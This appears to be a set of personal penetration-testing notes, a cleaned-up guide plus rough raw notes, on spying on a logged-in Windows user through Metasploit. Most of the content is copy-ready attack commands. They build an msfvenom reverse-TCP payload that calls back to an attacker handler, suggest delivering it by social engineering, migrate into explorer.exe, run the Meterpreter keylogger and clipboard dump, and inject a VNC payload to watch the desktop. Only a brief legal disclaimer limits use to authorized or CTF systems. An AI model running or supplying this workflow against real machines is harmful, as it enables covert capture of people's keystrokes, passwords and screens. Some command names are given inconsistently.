## Goal

Get an **interactive login** for a user on a Windows host so you can:

- capture keystrokes / clipboard
    
- view the desktop (via VNC)
    

Typical approach: get a Meterpreter session, migrate into the interactive user's process (usually `explorer.exe`), then start keylogger or spawn a VNC viewer tunnel.

---

## Prerequisites / assumptions

- You have a Meterpreter session on the target (via `exploit/multi/handler` + `msfvenom` payload).
    
- Target is Windows and has an interactive user logged in (RDP / console session).
    
---

## Quick checklist / high-level flow

1. Start handler and deliver payload (e.g. `msfvenom` reverse tcp).
    
2. When session opens: `bg` (background session) if you want to keep the listener.
    
3. Interact with the session: `sessions -i <id>`.
    
4. Check which user(s) are interactive and which process to migrate into.
    
5. `migrate <PID>` to a process owned by the interactive user (commonly `explorer.exe`).
    
6. Start keylogger: `key_scan_start` (or `key_scan start` depending on Meterpreter version).
    
7. Dump keystrokes: `key_scan_dump` (or `key_scan dump`).
    
8. For VNC viewing, use a local port forward (via `vnc` module) and connect `vncviewer 127.0.0.1:<port>`.
    
---

## Detailed step-by-step

### 1) Start handler & payload (example)

```bash
# On attack box
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT <your-port>
run -j
```

Create payload with msfvenom (example):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> -f exe -o payload.exe
```

Deliver payload by whatever vector (upload, service exe, social engineering, etc.).

---

### 2) When meterpreter session appears

```
[*] Meterpreter session 1 opened
```

- Background the session if needed: `background` or `bg`.
    
- List sessions: `sessions -l`.
    
- Interact: `sessions -i 1` (replace `1` with your session id).
    

---

### 3) Identify interactive users / sessions on the Windows host

Use these commands on the remote shell (meterpreter `shell` or `execute -f cmd.exe -i -t`) or run via `execute -H`:

```powershell
qwinsta            # lists RDP sessions and session IDs
query user         # shows users and whether they are active / disconnected
```

Look for a session with `State` showing `Active` and a `1` or otherwise a session where interactive login exists.

Also list running processes to choose a migration target:

```
ps                 # meterpreter's process list
ps -S <name>       # ps filtering (if available)
```

Prefer processes owned by the interactive user (e.g. `explorer.exe`, `powershell.exe`, `cmd.exe`) — `explorer.exe` is usually safest for desktop/keylogging.

---

### 4) Background -> switch session -> migrate

From the meterpreter prompt:

```text
# background if you were in interactive shell
bg

# list sessions and pick one
sessions -l
sessions -i 1

# find explorer.exe PID (example)
ps | grep explorer.exe
# then migrate into it
migrate <PID>
# e.g.
migrate 14141
```

Notes:

- Migrating to `explorer.exe` lets you inherit the interactive user's context (clipboard, desktop, keyboard events).
    
- If migration fails, try other user processes owned by the same user.
    

---

### 5) Keylogging with Meterpreter

Start the keylogger and capture keystrokes:

```text
# start keylogging
keyscan_start      # or: key_scan start

# dump captured keystrokes
keyscan_dump       # or: key_scan dump

# stop keylogging
keyscan_stop       # or: key_scan stop

# get help
help
```

Notes on naming: different Meterpreter builds/modules may use `keyscan_*` (no underscore) or `key_scan *`. Use `help` to confirm available commands.

To capture clipboard:

```text
# dump clipboard
clipboard_get
```

---

## Doing VNC to monitor RDP / interactive session

There are multiple approaches; a simple one uses `windows/local/payload_inject` or a similar local exploit that can inject a VNC payload into an interactive user's process.

**Basic steps:**

1. From a Meterpreter session (migrated into `explorer.exe` or other interactive process), use a local exploit or payload injector module.
    

```text
use exploit/windows/local/payload_inject
set SESSION <meterpreter-session-id>
set PID <explorer.exe PID>
set LPORT <local-port-if-needed>
run
```

2. The module can forward a VNC server to a local port (example mapping to `127.0.0.1:5900` or similar). After the module sets up the VNC server/tunnel locally, run:
    

```bash
vncviewer 127.0.0.1:5900
# or use the port set in the module's options
```

3. If using a direct VNC payload, ensure you set any passwords/options and that the VNC port is forwarded locally via `portfwd` or `autoroute`/tunneling as needed.
    

Example: Port-forward with meterpreter

```text
# forward remote port 5900 to local 5900
portfwd add -l 5900 -p 5900 -r 127.0.0.1
# then on attacker box
vncviewer 127.0.0.1:5900
```

---

## Troubleshooting & tips

- If you cannot migrate to `explorer.exe`, check process privileges and whether the process is protected (antivirus/EDR). Try other GUI processes.
    
- `keyscan_*` may require specific Meterpreter extensions (e.g., `priv` or `stdapi`) — run `use priv` or `load kiwi` where applicable, or `load stdapi`.
    
- If keystrokes are not captured for RDP sessions, the target may be running in a session isolation context; ensure you're in the correct session.
    
- Always `background` the session if you need multiple sessions active.
    
- Use `sessions -u <id>` to upgrade shell to meterpreter (if you have only a shell) via `exploit/multi/handler` techniques.
    

---

## Commands cheat-sheet

```text
# Metasploit / meterpreter
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
run -j
sessions -l
sessions -i <id>
background | bg
ps
migrate <PID>
keyscan_start | key_scan start
keyscan_dump  | key_scan dump
keyscan_stop  | key_scan stop
clipboard_get
portfwd add -l <LPORT> -p <RPORT> -r <RHOST>

# Windows host checks
qwinsta
query user
```

---

## Short example workflow (compact)

```text
# Handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
run -j

# After session 1 opened
sessions -i 1
ps | grep explorer.exe
migrate 14141
keyscan_start
# wait / capture
keyscan_dump
keyscan_stop

# VNC (if payload injected/forwarded)
vncviewer 127.0.0.1:5900
```

---

## Legal & ethical note

Only perform these actions in legal, authorized engagements (CTF systems or systems where you have explicit permission). Keylogging and remote desktop access are highly sensitive and illegal without authorization.

---

## Short cheat-sheet (for copy/paste)

```
# quick commands
sessions -l
sessions -i 1
ps | grep explorer.exe
migrate <PID>
keyscan_start
keyscan_dump
clipboard_get
portfwd add -l 5900 -p 5900 -r 127.0.0.1
vncviewer 127.0.0.1:5900
```

---

_End of notes._



















-------------------------NOTES
get-process
look for processes with 1 value (meaning interactive login)
process(internet exp,powershell,)

  check who's logged in
```
qwinsta
```

```
query user
```

### The goal 
the goal is to get an interactive login to be able to capture key strokes/clipboard or view desktop via vnc

use exploit/multi/handler/
msfvenom meterpreter tcp

once executed and meterpreter session started,
`bg`
pick session ( switch to that user's session )
`sessions -i 1`
migrate into target user's process:`<explorer.exe is the easiest option>'`

`migrate <explorer.exe's process ID`
`migrate 14141`
start keylogging
`key_scan start`
dump keystrokes
`key_scan dump`
`help`
--------------
## doing vnc to monitor RDP SESSIONS
### Monitor windows session

use exploit
```
use windows/local/payload_inject
```
set payload
![[Pasted image 20251004155750.png]]
sessions -l
```
set PID `explorer.exe's PID`
```

start vncviewer
vncviewer
127.0.0.1:5900 or the port used in options

